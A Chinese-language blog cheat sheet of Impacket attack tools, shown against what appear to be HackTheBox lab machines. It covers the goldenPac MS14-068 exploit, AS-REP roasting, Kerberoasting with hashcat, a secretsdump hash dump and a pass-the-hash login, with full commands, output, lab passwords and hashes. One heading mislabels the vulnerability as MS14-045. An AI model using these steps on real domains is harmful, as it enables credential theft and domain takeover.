---
title: Impacket 套件
date: 2026-07-03T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - MSSQL
  - Impacket
  - goldenPac
  - lookupsids
  - GetUserSPNs
  - GetNPUsers
  - Securetsdump
---
## mssqlclient

登录 mssql 数据库。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-mssqlclient admin:'m$$ql_S@_P@ssW0rd!'@10.129.26.95
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2014 RTM (no SP) (12.0.2000)
[!] Press help for extra shell commands
SQL (admin  admin@master)> 
```

## goldenPac

goldenPac 让一个普通域用户在 Kerberos 认证中被当成高权限用户。该工具利用的是 MS14-068 / CVE-2014-6324 的旧版 Kerberos KDC 漏洞，需要有一个有效的普通域账号密码，就能构造带有伪造 PAC 权限信息的 Kerberos 请求，让未打补丁的域控错误地接受 “该用户属于高权限组” 的声明。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Mantis]
└─$ impacket-goldenPac -dc-ip 10.129.26.112 htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[-] Couldn't get forest info ([Errno Connection error (htb.local:445)] [Errno 113] No route to host), continuing
[*] Attacking domain controller 10.129.26.112
[*] 10.129.26.112 found vulnerable!
[*] Requesting shares on mantis.htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file tHLcxQro.exe
[*] Opening SVCManager on mantis.htb.local.....
[*] Creating service XYoR on mantis.htb.local.....
[*] Starting service XYoR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
nt authority\system
```

MS14-045 的影响范围为：

```bash
Windows Server 2003 SP2
Windows Vista SP2
Windows Server 2008 SP2
Windows Server 2008 R2 SP1
Windows 7 SP1
Windows 8 / 8.1
Windows Server 2012
Windows Server 2012 R2
```

## lookupsid

枚举用户。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-lookupsid anonymous@10.129.229.17 20000 | tee Lookupsid_result.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.229.17
[*] StringBinding ncacn_np:10.129.229.17[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4194615774-2175524697-3563712290
498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: BLACKFIELD\Administrator (SidTypeUser)
501: BLACKFIELD\Guest (SidTypeUser)
502: BLACKFIELD\krbtgt (SidTypeUser)
512: BLACKFIELD\Domain Admins (SidTypeGroup)
513: BLACKFIELD\Domain Users (SidTypeGroup)
514: BLACKFIELD\Domain Guests (SidTypeGroup)
515: BLACKFIELD\Domain Computers (SidTypeGroup)
516: BLACKFIELD\Domain Controllers (SidTypeGroup)
517: BLACKFIELD\Cert Publishers (SidTypeAlias)
518: BLACKFIELD\Schema Admins (SidTypeGroup)
519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: BLACKFIELD\Protected Users (SidTypeGroup)
526: BLACKFIELD\Key Admins (SidTypeGroup)
```

使用 `anonymous` 连接目标，一直枚举到 20000。

## GetNPUsers

使用 GetNPUsers.py 查看是否有用户禁用了 Kerberos 预认证。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetNPUsers.py -no-pass -dc-ip 10.129.228.115 LicorDeBellota.htb/ -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User jari doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
```

用 hashcat 爆破出 hash 的值为 `Roper4155`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

/home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27813 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02:Roper4155
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68...bd1c02
Time.Started.....: Tue Apr  7 11:07:11 2026 (3 secs)
Time.Estimated...: Tue Apr  7 11:07:14 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3550.5 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10674176/14344385 (74.41%)
Rejected.........: 0/10674176 (0.00%)
Restore.Point....: 10665984/14344385 (74.36%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Ryanpenis -> RipBean
Hardware.Mon.#01.: Util: 62%

Started: Tue Apr  7 11:06:52 2026
Stopped: Tue Apr  7 11:07:14 2026
```

- 使用爆破出来的 hash 进一步枚举。

```bash
┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb]
└─$ GetUserSPNs.py -dc-ip 10.129.228.115 LicorDeBellota.htb/Kaorz:Roper4155        
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

## GetUserSPNs

使用 GetUserSPNs 枚举注册了 SPN 的域用户，发现有 `Administrator`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.18.244 -request  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-04-13 20:35:21.997740             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
 
```

保存为 `admin.hash`。 

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ vim admin.hash          
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ cat admin.hash 
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4
 
```

使用 hashcat 破解得到密码 `Ticketmaster1968`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Active]
└─$ hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27824 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6433153989932407b1811b1da1f2349b$5c80140037fc14244cf33efe080a7e3e2678774661d5277c18620d31a0243c3a013f9ecaa6d92b5a77b8610f657ae08287a1f5d9da982ab0b60961d2c8181a00171630f536cf371f2030b839ba32e0dcff7e1ae5bbacc708f779540a006a7a720c2c1eacba1ff2b42f337cdb9200ac4432c9482ea5bf9544065ec122ea07b7577a6a6dc39754d150a6116762f301f985c9d9f68c946f10b3d5d27a33eebddc03c8190cb3c2ea7699057b78fb54ae8bb5916c66d1191da47065e4b922490a08c1a8c5203c1cfc64577508f242e3561b3e16517f07f076107b656963a4cc492e2ea5b7a4709c904b11616c6b774a6f4a7b228015e3aa7f336365fc941878ca0978241dca9f2da7eba09dcec2e89c4e05a1927d2a3179a6113fc0528f452e6551f3828b23ea8805aa060ff690bb65c39f9f1ecf24a9ffa1d6c85cba864fa6187466181959ea170c19935736aeb15f70edd246149daa533501afdaf1b21a49a11d13ec96678dbf8231bbd301515a309eb680c25a381ed3b6974c9e7cb5729c12991a9d44cc95c758f0cd7da6e45fa6023be1b1cc3d5b7eb333c1c07e7519a5c80933250c9c40119c2678a19fa78849c960e9ece849b2441710047d12eb88f266c46aad7f541af3ffb63353cf5360662649069fdd79356f51e173ab7919efa27ad95dda7ba8e051574cb678c505ee027244f3f0fdead1b49eea3890d3574f8dd50e6867e77075f75b4887299427b8fbb8c60dc1c05856079044418b81951c225d7f3a77654b34f418c4d0c1acf17519f3a7478650818f4882cdb0b6bf875a919fe801df411276d19110b57f3c8a1ff65fa11e43a42e24d75be612143c396ccf33aba8a4ccecf8e036b858754c62f0ece3bfc08afa1a891948fc57a3c8cab85df7f9df4a767c2e96ac3d5432d6df0dcb1d965bf0ba00d4274a8efadba751903658e4dbab6a95df8da8cad0e069e80453faa345f7f6383fa6257807fdc81073f576876d8bf767d2a8e64c0dce447329a3f73444143d3b96fd128259596e817c85eb0b33920e7e181c90efb7d43244782a96c7981e11eb3e1f50b25c547240fd40752d3085694244f8517fb0cd045d147a2e65cfed62ec3f3541e20a4e3b9c237d42bd9245971e2fb6a8b6853a7b31879717699387a37f7eb319b1ccc335aa8ae47e808f3f966f6346841c61203eae4d0c2293b4e31caa5cedec3e3a3da7890784432a15b19907f2ca326d4bad57ab24b3ecedb32d28d23d5e73713945e4:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...3945e4
Time.Started.....: Tue Apr 14 07:52:49 2026 (4 secs)
Time.Estimated...: Tue Apr 14 07:52:53 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2887.5 kH/s (1.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Teague51
Hardware.Mon.#01.: Util: 53%

Started: Tue Apr 14 07:52:37 2026
Stopped: Tue Apr 14 07:52:53 2026
```

## Securetsdump

执行 `secretsdump` 暴露出 `administrator` 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.22.120
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:107983a00ee44777ecd57b33b6caed05:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:9494462d4080b6a0abcef757f627c17b2aa14822ea0ef7281ed1a46119bfc950
SAUNA$:aes128-cts-hmac-sha1-96:ce8abe15851e50bcfa804121824bae56
SAUNA$:des-cbc-md5:89237a5dfed60416
[*] Cleaning up...
```

登陆拿到权限 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Sauna]
└─$ evil-winrm -i 10.129.22.120 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5183e6faa81a508920196120306ef1c2
```